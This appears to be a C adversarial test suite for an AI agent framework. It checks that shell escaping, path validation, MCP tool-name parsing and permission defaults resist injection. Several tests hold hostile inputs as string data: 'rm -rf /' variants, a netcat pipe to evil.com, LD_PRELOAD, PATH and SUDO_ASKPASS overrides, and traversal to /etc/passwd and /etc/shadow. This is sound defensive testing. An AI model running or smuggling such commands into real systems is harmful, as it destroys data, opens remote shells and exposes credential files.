/* Adversarial tests: injection attacks — command injection, path traversal,
 * JSON injection, environment variable injection.
 * Every test uses hu_tracking_allocator_t to verify zero leaks. */
#include "human/agent/instruction_discover.h"
#include "human/core/allocator.h"
#include "human/core/error.h"
#include "human/hook.h"
#include "human/hook_pipeline.h"
#include "human/mcp_manager.h"
#include "human/permission.h"
#include "test_framework.h"
#include <stdlib.h>
#include <string.h>

/* ══════════════════════════════════════════════════════════════════════════
 * Hook Command Injection
 * ══════════════════════════════════════════════════════════════════════════ */

/* 1. Tool name with semicolon: ";rm -rf /" */
static void test_hook_inject_semicolon_rm(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous_tool = ";rm -rf /";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous_tool, strlen(dangerous_tool), &escaped,
                                          &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    HU_ASSERT_NOT_NULL(escaped);
    /* Must be single-quoted — semicolon not interpreted */
    HU_ASSERT(escaped[0] == '\'');
    HU_ASSERT(escaped[escaped_len - 1] == '\'');
    /* The raw semicolon should not appear outside quotes */
    HU_ASSERT(strstr(escaped, ";rm") == NULL || escaped[0] == '\'');
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 2. Backtick injection: tool name with `$(whoami)` */
static void test_hook_inject_backtick_command_sub(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous = "`$(whoami)`";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err =
        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    /* Backticks and $() should be neutralized inside single quotes */
    HU_ASSERT(escaped[0] == '\'');
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 3. Pipe injection: "|nc evil.com 4444" */
static void test_hook_inject_pipe(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous = "|nc evil.com 4444";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err =
        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    HU_ASSERT(escaped[0] == '\'');
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 4. Environment variable injection via tool args: "KEY=val;export LD_PRELOAD=evil.so" */
static void test_hook_inject_env_var(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous = "KEY=val;export LD_PRELOAD=evil.so";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err =
        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    HU_ASSERT(escaped[0] == '\'');
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 5. Newline injection: tool name with embedded newlines */
static void test_hook_inject_newline(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous = "safe_tool\nrm -rf /";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err =
        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    /* Newline must be safely inside single quotes */
    HU_ASSERT(escaped[0] == '\'');
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 6. Hook pipeline: verify shell escape is actually used for tool name */
static void test_hook_pipeline_tool_name_escaped(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    hu_hook_registry_t *reg = NULL;
    hu_hook_registry_create(&alloc, &reg);

    hu_hook_entry_t entry = {
        .name = "audit",
        .name_len = 5,
        .event = HU_HOOK_PRE_TOOL_EXECUTE,
        .command = "echo $TOOL_NAME",
        .command_len = 15,
        .timeout_sec = 5,
        .required = false,
    };
    hu_hook_registry_add(reg, &alloc, &entry);

    hu_hook_mock_config_t mock = {.exit_code = 0, .stdout_data = "", .stdout_len = 0};
    hu_hook_mock_set(&mock);

    /* Pass a dangerous tool name through the pipeline */
    const char *bad_tool = "$(rm -rf /)";
    hu_hook_result_t result;
    memset(&result, 0, sizeof(result));
    hu_error_t err =
        hu_hook_pipeline_pre_tool(reg, &alloc, bad_tool, strlen(bad_tool), "{}", 2, &result);
    HU_ASSERT_EQ(err, HU_OK);

    /* Verify the command passed to mock had the tool name escaped */
    const char *last_cmd = hu_hook_mock_last_command();
    if (last_cmd) {
        /* The dangerous string should not appear unquoted */
        HU_ASSERT(strstr(last_cmd, "$(rm") == NULL || strstr(last_cmd, "'$(rm") != NULL);
    }

    hu_hook_result_free(&alloc, &result);
    hu_hook_mock_reset();
    hu_hook_registry_destroy(reg, &alloc);
    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 7. Double single-quote escape: tool name with single quotes */
static void test_hook_inject_single_quote_in_name(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous = "tool'name;id";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err =
        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    /* Single quote should be properly escaped: 'tool'\''name;id' */
    HU_ASSERT_STR_CONTAINS(escaped, "'\\''");
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* ══════════════════════════════════════════════════════════════════════════
 * Path Traversal in Instruction Discovery
 * ══════════════════════════════════════════════════════════════════════════ */

/* 8. Path traversal: ../../etc/passwd */
static void test_instruction_path_traversal_etc_passwd(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *traversal = "../../../../../../etc/passwd";
    char *canonical = NULL;
    size_t canonical_len = 0;
    hu_error_t err = hu_instruction_validate_path(&alloc, traversal, strlen(traversal), &canonical,
                                                  &canonical_len);
    /* If it succeeds, the canonical path should be the resolved absolute path,
     * not containing ".." */
    if (err == HU_OK && canonical) {
        HU_ASSERT(strstr(canonical, "..") == NULL);
        alloc.free(alloc.ctx, canonical, canonical_len + 1);
    }

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 9. Absolute path that doesn't exist */
static void test_instruction_path_absolute_nonexistent(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *path = "/nonexistent_adversarial_test_path_12345/file.md";
    char *canonical = NULL;
    size_t canonical_len = 0;
    hu_error_t err =
        hu_instruction_validate_path(&alloc, path, strlen(path), &canonical, &canonical_len);
    /* Should fail — path doesn't exist, realpath fails */
    if (err != HU_OK) {
        HU_ASSERT_NULL(canonical);
    } else if (canonical) {
        alloc.free(alloc.ctx, canonical, canonical_len + 1);
    }

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 10. Null byte injection in path */
static void test_instruction_path_null_byte_injection(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    /* Path with embedded null byte: "/tmp\0../../etc/shadow" */
    char bad_path[] = "/tmp\0../../etc/shadow";
    char *canonical = NULL;
    size_t canonical_len = 0;
    hu_error_t err = hu_instruction_validate_path(&alloc, bad_path, sizeof(bad_path) - 1,
                                                  &canonical, &canonical_len);
    /* Should detect null byte in path and reject */
    if (err == HU_OK && canonical) {
        HU_ASSERT(strstr(canonical, "shadow") == NULL);
        alloc.free(alloc.ctx, canonical, canonical_len + 1);
    }

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 11. Double-encoded path traversal: %2e%2e%2f */
static void test_instruction_path_double_encoded(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *encoded = "/tmp/%2e%2e/%2e%2e/etc/passwd";
    char *canonical = NULL;
    size_t canonical_len = 0;
    hu_error_t err =
        hu_instruction_validate_path(&alloc, encoded, strlen(encoded), &canonical, &canonical_len);
    /* The %2e encoding is literal characters — realpath should handle or fail */
    if (err == HU_OK && canonical) {
        alloc.free(alloc.ctx, canonical, canonical_len + 1);
    }

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 12. Instruction discovery: empty workspace dir */
static void test_instruction_discovery_empty_dir(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    hu_instruction_discovery_t *disc = NULL;
    hu_error_t err = hu_instruction_discovery_run(&alloc, "", 0, &disc);
    /* Should handle gracefully — empty dir means no discovery */
    if (err == HU_OK && disc) {
        hu_instruction_discovery_destroy(&alloc, disc);
    }

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* ══════════════════════════════════════════════════════════════════════════
 * MCP JSON Injection
 * ══════════════════════════════════════════════════════════════════════════ */

/* 13. __proto__ key in tool name */
static void test_mcp_json_proto_key(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);
    (void)alloc;

    /* Tool name "__proto__" — should not cause prototype pollution */
    bool is_mcp = hu_mcp_tool_is_mcp("__proto__");
    HU_ASSERT_FALSE(is_mcp);

    const char *srv = NULL, *tool = NULL;
    size_t srv_len = 0, tool_len = 0;
    bool parsed = hu_mcp_tool_parse_name("mcp____proto____tool", &srv, &srv_len, &tool, &tool_len);
    /* Parse should work — server name is "__proto__", tool is "tool" */
    if (parsed) {
        HU_ASSERT_EQ(srv_len, 10); /* "__proto__" */
    }

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 14. Constructor key in tool name */
static void test_mcp_json_constructor_key(void) {
    bool is_mcp = hu_mcp_tool_is_mcp("mcp__constructor__valueOf");
    HU_ASSERT_TRUE(is_mcp);

    const char *srv = NULL, *tool = NULL;
    size_t srv_len = 0, tool_len = 0;
    bool parsed =
        hu_mcp_tool_parse_name("mcp__constructor__valueOf", &srv, &srv_len, &tool, &tool_len);
    HU_ASSERT_TRUE(parsed);
    /* Server is "constructor", tool is "valueOf" */
    HU_ASSERT_EQ(srv_len, 11);
    HU_ASSERT_EQ(tool_len, 7);
}

/* 15. Nested JSON string in tool args — should be passed through as-is */
static void test_mcp_nested_json_string(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);
    (void)alloc;

    /* A tool name with embedded JSON-like content */
    const char *name = "mcp__server__{\"key\":\"value\"}";
    const char *srv = NULL, *tool = NULL;
    size_t srv_len = 0, tool_len = 0;
    bool parsed = hu_mcp_tool_parse_name(name, &srv, &srv_len, &tool, &tool_len);
    if (parsed) {
        /* Tool name includes the JSON string */
        HU_ASSERT_GT(tool_len, 0);
    }

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 16. Numeric overflow in tool name: huge numeric string */
static void test_mcp_numeric_key_overflow(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    /* Tool name with very large number */
    char *built = NULL;
    size_t built_len = 0;
    hu_error_t err =
        hu_mcp_tool_build_name(&alloc, "server", "99999999999999999999", &built, &built_len);
    if (err == HU_OK) {
        HU_ASSERT_NOT_NULL(built);
        alloc.free(alloc.ctx, built, built_len + 1);
    }

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* ══════════════════════════════════════════════════════════════════════════
 * Hook Environment Variable Injection
 * ══════════════════════════════════════════════════════════════════════════ */

/* 17. LD_PRELOAD injection attempt via tool name */
static void test_hook_env_ld_preload(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous = "LD_PRELOAD=/tmp/evil.so tool_exec";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err =
        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    /* Must be safely quoted */
    HU_ASSERT(escaped[0] == '\'');
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 18. PATH override injection */
static void test_hook_env_path_override(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous = "PATH=/tmp/evil:$PATH bash";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err =
        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    HU_ASSERT(escaped[0] == '\'');
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 19. SUDO_ASKPASS injection */
static void test_hook_env_sudo_askpass(void) {
    hu_tracking_allocator_t *ta = hu_tracking_allocator_create();
    hu_allocator_t alloc = hu_tracking_allocator_allocator(ta);

    const char *dangerous = "SUDO_ASKPASS=/tmp/evil.sh sudo -A id";
    char *escaped = NULL;
    size_t escaped_len = 0;
    hu_error_t err =
        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
    HU_ASSERT_EQ(err, HU_OK);
    HU_ASSERT(escaped[0] == '\'');
    alloc.free(alloc.ctx, escaped, escaped_len + 1);

    HU_ASSERT_EQ(hu_tracking_allocator_leaks(ta), 0);
    hu_tracking_allocator_destroy(ta);
}

/* 20. Permission: unknown tool returns HU_PERM_DENY — a sentinel above every
   agent-assignable tier so no agent (even DANGER_FULL_ACCESS) can invoke it. */
static void test_permission_unknown_tool_defaults_danger(void) {
    hu_permission_level_t level = hu_permission_get_tool_level("totally_unknown_tool_xyz");
    HU_ASSERT_EQ(level, HU_PERM_DENY);
    HU_ASSERT_FALSE(hu_permission_check(HU_PERM_DANGER_FULL_ACCESS, level));
}

/* 21. Permission: NULL tool name returns DENY and does not crash. */
static void test_permission_null_tool_name(void) {
    hu_permission_level_t level = hu_permission_get_tool_level(NULL);
    HU_ASSERT_EQ(level, HU_PERM_DENY);
    HU_ASSERT_FALSE(hu_permission_check(HU_PERM_DANGER_FULL_ACCESS, level));
}

/* ══════════════════════════════════════════════════════════════════════════
 * Suite runner
 * ══════════════════════════════════════════════════════════════════════════ */

void run_adversarial_injection_tests(void) {
    HU_TEST_SUITE("Adversarial: Injection");

    /* Hook command injection */
    HU_RUN_TEST(test_hook_inject_semicolon_rm);
    HU_RUN_TEST(test_hook_inject_backtick_command_sub);
    HU_RUN_TEST(test_hook_inject_pipe);
    HU_RUN_TEST(test_hook_inject_env_var);
    HU_RUN_TEST(test_hook_inject_newline);
    HU_RUN_TEST(test_hook_pipeline_tool_name_escaped);
    HU_RUN_TEST(test_hook_inject_single_quote_in_name);

    /* Path traversal */
    HU_RUN_TEST(test_instruction_path_traversal_etc_passwd);
    HU_RUN_TEST(test_instruction_path_absolute_nonexistent);
    HU_RUN_TEST(test_instruction_path_null_byte_injection);
    HU_RUN_TEST(test_instruction_path_double_encoded);
    HU_RUN_TEST(test_instruction_discovery_empty_dir);

    /* MCP JSON injection */
    HU_RUN_TEST(test_mcp_json_proto_key);
    HU_RUN_TEST(test_mcp_json_constructor_key);
    HU_RUN_TEST(test_mcp_nested_json_string);
    HU_RUN_TEST(test_mcp_numeric_key_overflow);

    /* Hook env injection */
    HU_RUN_TEST(test_hook_env_ld_preload);
    HU_RUN_TEST(test_hook_env_path_override);
    HU_RUN_TEST(test_hook_env_sudo_askpass);

    /* Permission defaults */
    HU_RUN_TEST(test_permission_unknown_tool_defaults_danger);
    HU_RUN_TEST(test_permission_null_tool_name);
}
